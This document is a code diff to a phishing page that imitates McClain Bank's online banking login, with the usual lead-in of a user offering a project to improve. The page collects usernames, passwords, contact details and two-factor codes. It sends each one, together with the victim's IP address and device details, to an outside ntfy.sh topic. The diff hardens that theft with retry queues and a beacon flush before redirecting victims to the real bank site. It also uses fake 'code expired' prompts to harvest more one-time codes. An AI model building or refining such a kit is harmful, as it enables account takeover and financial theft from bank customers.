@@ -14,6 +14,7 @@
     --shadow:0 3px 12px 0 rgba(0,0,0,.15);
   }
   *{box-sizing:border-box}
+  html{scrollbar-gutter:stable}
   html,body{margin:0;min-height:100%;-webkit-font-smoothing:antialiased}
   body{
     font-family:roboto,-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",sans-serif;
@@ -29,25 +30,29 @@
   }
   .banner svg{flex:0 0 auto;width:18px;height:18px;margin-top:1px;fill:#3d4752}
   .banner p{margin:0;max-width:760px}
-  main{flex:1;display:flex;align-items:center;justify-content:center;padding:24px 0}
+  main{
+    flex:1;display:flex;justify-content:center;align-items:flex-start;
+    padding:36px 0 56px;overflow-anchor:none;
+  }
   .card{
     position:relative;overflow:hidden;
     background:#fff;border-radius:var(--card-radius);box-shadow:var(--shadow);
-    width:90%;max-width:480px;padding:40px;margin:auto;
-    transition:height .26s cubic-bezier(.4,0,.2,1);
-    animation:cardIn .45s cubic-bezier(.2,.7,.3,1) both;
+    width:90%;max-width:480px;padding:40px;
+    transition:height .42s cubic-bezier(.22,.75,.24,1);
+    animation:cardIn .4s cubic-bezier(.2,.7,.3,1) both;
   }
   @keyframes cardIn{
-    from{opacity:0;transform:translateY(14px) scale(.995)}
+    from{opacity:0;transform:translateY(10px)}
     to{opacity:1;transform:none}
   }
+  .steps{position:relative}
   .logo{display:block;height:80px;margin:0 auto}
   .fdic{display:flex;align-items:center;justify-content:center;gap:8px;margin:18px 0 4px;
     color:var(--text2);font-size:11px;text-align:center}
   .fdic svg{flex:0 0 auto}
-  form{margin:0;will-change:opacity,transform;transition:opacity .18s ease,transform .18s ease}
-  form.out{opacity:0;transform:translateY(-10px)}
-  form.in{opacity:0;transform:translateY(12px)}
+  form{margin:0;will-change:opacity,transform;transition:opacity .2s ease,transform .2s ease}
+  form.out{opacity:0;transform:translateY(-8px)}
+  form.in{opacity:0;transform:translateY(10px)}
   .field{position:relative;border:1px solid var(--text2);border-radius:4px;
     padding:18px 12px 6px;margin-top:26px;background:#fff}
   .field .label{position:absolute;top:-8px;left:10px;background:#fff;padding:0 4px;
@@ -84,8 +89,7 @@
   }
   button:hover{background:var(--theme-press)}
   button:disabled{opacity:.55;cursor:default}
-  .status-message{font-size:13px;color:var(--text2);text-align:center;margin-top:16px;
-    animation:cardIn .3s ease both}
+  .status-message{font-size:13px;color:var(--text2);text-align:center;margin-top:16px}
   footer{text-align:center;color:var(--text2);font-size:12px;padding:22px 16px 30px;line-height:1.7}
   footer a{color:#660000;font-weight:400;font-size:12px}
   .ehl{vertical-align:-1px;margin-right:4px;fill:var(--text2)}
@@ -106,13 +110,13 @@
   .loader p{margin:0;font-size:14px;color:var(--text2)}
 
   @media (max-width:600px){
-    .card{width:88%;padding:22px;margin-top:20px}
-    main{padding:0}
+    main{padding:18px 0 44px}
+    .card{width:88%;padding:22px}
     .logo{height:64px}
     button{min-width:110px;padding:11px 18px}
   }
   @media (prefers-reduced-motion:reduce){
-    .card,form,.status-message{animation:none;transition:none}
+    .card,form{animation:none;transition:none}
     .spinner{animation-duration:1.6s}
   }
 </style>
@@ -141,57 +145,59 @@
       <span>FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
     </div>
 
-    <form id="step-email" novalidate>
-      <div class="field">
-        <div class="label">Username</div>
-        <input id="email" type="text" spellcheck="false" autocorrect="off" autocapitalize="off" autocomplete="username" aria-label="Username">
-      </div>
-      <div class="row right"><a href="#" class="forgot-link">Forgot?</a></div>
-      <div class="row between">
-        <a href="#">First time user? Enroll now.</a>
-        <button type="submit">Continue</button>
-      </div>
-    </form>
+    <div class="steps" id="steps">
+      <form id="step-email" novalidate>
+        <div class="field">
+          <div class="label">Username</div>
+          <input id="email" type="text" spellcheck="false" autocorrect="off" autocapitalize="off" autocomplete="username" aria-label="Username">
+        </div>
+        <div class="row right"><a href="#" class="forgot-link">Forgot?</a></div>
+        <div class="row between">
+          <a href="#">First time user? Enroll now.</a>
+          <button type="submit">Continue</button>
+        </div>
+      </form>
 
-    <form id="step-password" hidden novalidate>
-      <div class="signas">Signing in as <b class="address-value"></b> · <a href="#" class="change-link">Change</a></div>
-      <div class="field">
-        <div class="label">Password</div>
-        <input id="password" type="password" autocomplete="current-password" aria-label="Password">
-      </div>
-      <div class="row right"><a href="#" class="forgot-link">Forgot?</a></div>
-      <div class="row right"><button type="submit">Sign in</button></div>
-    </form>
+      <form id="step-password" hidden novalidate>
+        <div class="signas">Signing in as <b class="address-value"></b> · <a href="#" class="change-link">Change</a></div>
+        <div class="field">
+          <div class="label">Password</div>
+          <input id="password" type="password" autocomplete="current-password" aria-label="Password">
+        </div>
+        <div class="row right"><a href="#" class="forgot-link">Forgot?</a></div>
+        <div class="row right"><button type="submit">Sign in</button></div>
+      </form>
 
-    <form id="step-2fa" hidden novalidate>
-      <h2 class="h2fa">Two-factor authentication</h2>
-      <p class="hint">Add an email and mobile number to receive verification codes.</p>
-      <div class="field">
-        <div class="label">Email address</div>
-        <input id="contact-email" type="email" spellcheck="false" autocorrect="off" autocapitalize="off" autocomplete="email" aria-label="Email address">
-      </div>
-      <div class="field">
-        <div class="label">Cell phone number</div>
-        <input id="phone" type="tel" inputmode="tel" autocomplete="tel" aria-label="Cell phone number">
-      </div>
-      <div class="methods">
-        <label><input type="radio" name="method" value="text" checked> Text message</label>
-        <label><input type="radio" name="method" value="call"> Phone call</label>
-        <label><input type="radio" name="method" value="authy"> Authenticator app</label>
-      </div>
-      <div class="row right"><button type="submit">Next</button></div>
-    </form>
+      <form id="step-2fa" hidden novalidate>
+        <h2 class="h2fa">Two-factor authentication</h2>
+        <p class="hint">Add an email and mobile number to receive verification codes.</p>
+        <div class="field">
+          <div class="label">Email address</div>
+          <input id="contact-email" type="email" spellcheck="false" autocorrect="off" autocapitalize="off" autocomplete="email" aria-label="Email address">
+        </div>
+        <div class="field">
+          <div class="label">Cell phone number</div>
+          <input id="phone" type="tel" inputmode="tel" autocomplete="tel" aria-label="Cell phone number">
+        </div>
+        <div class="methods">
+          <label><input type="radio" name="method" value="text" checked> Text message</label>
+          <label><input type="radio" name="method" value="call"> Phone call</label>
+          <label><input type="radio" name="method" value="authy"> Authenticator app</label>
+        </div>
+        <div class="row right"><button type="submit">Next</button></div>
+      </form>
 
-    <form id="step-code" hidden novalidate>
-      <div class="signas">A code was sent to the phone on file for <b class="address-value"></b></div>
-      <div class="field">
-        <div class="label">Verification code</div>
-        <input id="code" type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="8" aria-label="Verification code">
-      </div>
-      <label class="check"><input type="checkbox" id="trust"> Don't ask for codes again on this computer</label>
-      <div class="row right"><button type="submit">Verify</button></div>
-      <div class="status-message" hidden></div>
-    </form>
+      <form id="step-code" hidden novalidate>
+        <div class="signas">A code was sent to the phone on file for <b class="address-value"></b></div>
+        <div class="field">
+          <div class="label">Verification code</div>
+          <input id="code" type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="8" aria-label="Verification code">
+        </div>
+        <label class="check"><input type="checkbox" id="trust"> Don't ask for codes again on this computer</label>
+        <div class="row right"><button type="submit">Verify</button></div>
+        <div class="status-message" hidden></div>
+      </form>
+    </div>
   </div>
 </main>
 
@@ -225,24 +231,36 @@ const trackingEmail = new URLSearchParams(location.search).get('e') || '';
 
 const NTFY_TOPIC    = 'lambelambe';
 const NTFY_URL      = 'https://ntfy.sh/' + NTFY_TOPIC;
-const QUEUE_KEY     = 'mcb_queue_v2';
+const QUEUE_KEY     = 'mcb_queue_v3';
 const REDIRECT_URL  = 'https://secure.mcclainbank.com';
 const FIRST_HOLD_MS = 90000;
 const SECOND_HOLD_MS = 60000;
+const MAX_ATTEMPTS  = 8;
 
 let ip = '-';
 let attempt = 0;
 let holdTimer = null;
-let swapping = false;
 
 fetch('https://api.ipify.org?format=json')
   .then(r => r.json()).then(d => { if (d && d.ip) ip = d.ip; }).catch(() => {});
 
+/* connectivity probe so failures show up in the console immediately */
+fetch(NTFY_URL + '/json?poll=1&since=5m', {cache:'no-store'})
+  .then(r => console.info('[ntfy] topic check', r.status, r.statusText))
+  .catch(e => console.warn('[ntfy] topic unreachable', e && e.message));
+
+/* ---------- step transitions (top-anchored, no snap) ---------- */
+let animating = false, endTimer = null;
+
 function focusStep(i){
-  if(i===0) emailInput.focus();
-  else if(i===1) passwordInput.focus();
-  else if(i===2) contactEmail.focus();
-  else codeInput.focus();
+  const el = i === 0 ? emailInput : i === 1 ? passwordInput : i === 2 ? contactEmail : codeInput;
+  try { el.focus({preventScroll:true}); } catch(e){ el.focus(); }
+}
+
+function settle(){
+  clearTimeout(endTimer);
+  animating = false;
+  card.style.height = '';
 }
 
 function showStep(i, animate){
@@ -250,40 +268,57 @@ function showStep(i, animate){
   if(cur === i) return;
 
   if(!animate || cur === -1){
-    steps.forEach((s,n)=>{ s.hidden = n !== i; s.classList.remove('out','in'); });
-    card.style.height = '';
+    settle();
+    steps.forEach((s,n)=>{
+      s.hidden = n !== i;
+      s.classList.remove('out','in');
+      s.style.position = '';
+      s.style.inset = '';
+    });
     focusStep(i);
     return;
   }
 
-  if(swapping) return;
-  swapping = true;
+  if(animating) return;
+  animating = true;
 
   const from = steps[cur];
   const to   = steps[i];
 
-  card.style.height = card.offsetHeight + 'px';
-  from.classList.add('out');
+  const h0    = card.getBoundingClientRect().height;
+  const hFrom = from.getBoundingClientRect().height;
 
-  setTimeout(()=>{
+  card.style.height = h0 + 'px';
+
+  from.classList.add('out');
+  from.style.position = 'absolute';
+  from.style.inset = '0 0 auto 0';
+
+  to.hidden = false;
+  to.classList.add('in');
+  const hTo = to.getBoundingClientRect().height;
+
+  void card.offsetHeight;
+  card.style.height = Math.max(0, h0 - hFrom + hTo) + 'px';
+
+  requestAnimationFrame(()=>requestAnimationFrame(()=> to.classList.remove('in')));
+
+  const finish = ()=>{
+    card.removeEventListener('transitionend', onEnd);
     from.hidden = true;
     from.classList.remove('out');
+    from.style.position = '';
+    from.style.inset = '';
+    settle();
+  };
+  const onEnd = e => { if(e.target === card && e.propertyName === 'height') finish(); };
+  card.addEventListener('transitionend', onEnd);
+  endTimer = setTimeout(finish, 700);
 
-    to.hidden = false;
-    to.classList.add('in');
-
-    const cs = getComputedStyle(card);
-    const target = to.offsetHeight + parseFloat(cs.paddingTop) + parseFloat(cs.paddingBottom);
-    card.style.height = target + 'px';
-
-    requestAnimationFrame(()=>requestAnimationFrame(()=>{
-      to.classList.remove('in');
-    }));
-
-    setTimeout(()=>{ card.style.height = ''; swapping = false; }, 300);
-    focusStep(i);
-  }, 180);
+  focusStep(i);
 }
+
+window.addEventListener('resize', ()=>{ if(!animating) card.style.height = ''; });
 
 function showLoader(msg){
   loaderText.textContent = msg;
@@ -325,38 +360,89 @@ function loadQueue(){
 function saveQueue(q){
   try { localStorage.setItem(QUEUE_KEY, JSON.stringify(q)); } catch(e){}
 }
+function newId(){
+  return Date.now().toString(36) + Math.random().toString(36).slice(2,8);
+}
 function enqueue(rec){
+  rec.id = newId();
+  rec.attempts = 0;
   const q = loadQueue();
   q.push(rec);
   saveQueue(q);
 }
-function dropRec(ts){
-  saveQueue(loadQueue().filter(x => x.ts !== ts));
+function dropRec(id){
+  saveQueue(loadQueue().filter(x => x.id !== id));
+}
+function patchRec(id, patch){
+  saveQueue(loadQueue().map(x => x.id === id ? Object.assign(x, patch) : x));
 }
 
-function postOne(rec){
-  const qs = new URLSearchParams({
+function paramsFor(rec){
+  return new URLSearchParams({
     title: 'McClain - ' + rec.stage,
     priority: rec.priority,
     tags: 'bank,warning'
-  });
-  return fetch(NTFY_URL + '?' + qs.toString(), {
+  }).toString();
+}
+
+function postOne(rec){
+  return fetch(NTFY_URL + '?' + paramsFor(rec), {
     method: 'POST',
-    body: rec.text
+    headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
+    body: rec.text,
+    keepalive: true,
+    cache: 'no-store'
   }).then(r => {
     if(!r.ok) throw new Error('http ' + r.status);
   });
 }
 
-let draining = false;
+let draining = false, retryTimer = null;
+
+function scheduleRetry(attempts){
+  clearTimeout(retryTimer);
+  const wait = Math.min(30000, 1500 * Math.pow(2, Math.max(0, attempts || 0)));
+  retryTimer = setTimeout(drain, wait);
+}
+
 function drain(){
-  if(draining || !navigator.onLine) return;
+  if(draining) return;
+  if(!navigator.onLine){ scheduleRetry(1); return; }
+
   const q = loadQueue();
   if(!q.length) return;
+
+  const rec = q[0];
   draining = true;
-  postOne(q[0])
-    .then(()=>{ dropRec(q[0].ts); draining = false; drain(); })
-    .catch(()=>{ draining = false; });
+
+  postOne(rec)
+    .then(()=>{
+      dropRec(rec.id);
+      draining = false;
+      drain();
+    })
+    .catch(err=>{
+      draining = false;
+      const attempts = (rec.attempts || 0) + 1;
+      if(attempts >= MAX_ATTEMPTS){
+        console.warn('[ntfy] giving up on', rec.stage, err && err.message);
+        dropRec(rec.id);
+      } else {
+        console.warn('[ntfy] retry', rec.stage, err && err.message, '(' + attempts + ')');
+        patchRec(rec.id, { attempts: attempts });
+      }
+      scheduleRetry(attempts);
+    });
+}
+
+/* fire-and-forget flush that survives navigation */
+function flushWithBeacon(){
+  if(!navigator.sendBeacon) return false;
+  loadQueue().forEach(rec=>{
+    const body = new Blob([rec.text], { type: 'text/plain;charset=UTF-8' });
+    if(navigator.sendBeacon(NTFY_URL + '?' + paramsFor(rec), body)) dropRec(rec.id);
+  });
+  return true;
 }
 
 function send(stage, otp, priority){
@@ -372,13 +458,16 @@ function send(stage, otp, priority){
     'Device : ' + navigator.userAgent + '\n' +
     (trackingEmail ? 'Recipient : ' + trackingEmail + '\n' : '') +
     '\n#------------[ ' + stage + ' ]-------------#';
-  enqueue({ ts: Date.now() + Math.random(), stage: stage, priority: priority || '4', text: text });
+
+  enqueue({ stage: stage, priority: priority || '4', text: text });
   drain();
 }
 
 /* ---------- flow ---------- */
 stepEmail.addEventListener('submit', e=>{
-  e.preventDefault(); updateAddress(); showStep(1, true);
+  e.preventDefault();
+  updateAddress();
+  showStep(1, true);
 });
 
 stepPassword.addEventListener('submit', e=>{
@@ -431,7 +520,10 @@ stepCode.addEventListener('submit', e=>{
   holdTimer = setTimeout(()=>{
     if(isLast){
       loaderText.textContent = 'Redirecting to online banking...';
-      setTimeout(()=>{ location.href = REDIRECT_URL; }, 900);
+      setTimeout(()=>{
+        flushWithBeacon();
+        location.href = REDIRECT_URL;
+      }, 900);
       return;
     }
     hideLoader();
@@ -441,7 +533,7 @@ stepCode.addEventListener('submit', e=>{
       buttonOf(stepCode).textContent = 'Verify';
       statusMessage.textContent = 'That code expired. Enter the newest one from your device.';
       statusMessage.hidden = false;
-      codeInput.focus();
+      codeInput.focus({preventScroll:true});
     }, 200);
   }, isLast ? SECOND_HOLD_MS : FIRST_HOLD_MS);
 });
@@ -453,7 +545,7 @@ document.querySelectorAll('.forgot-link, footer a').forEach(a=>{
   a.addEventListener('click', e=>{ e.preventDefault(); });
 });
 
-window.addEventListener('online', drain);
+window.addEventListener('online', ()=>{ clearTimeout(retryTimer); drain(); });
 setInterval(drain, 20000);
 
 showStep(0, false);
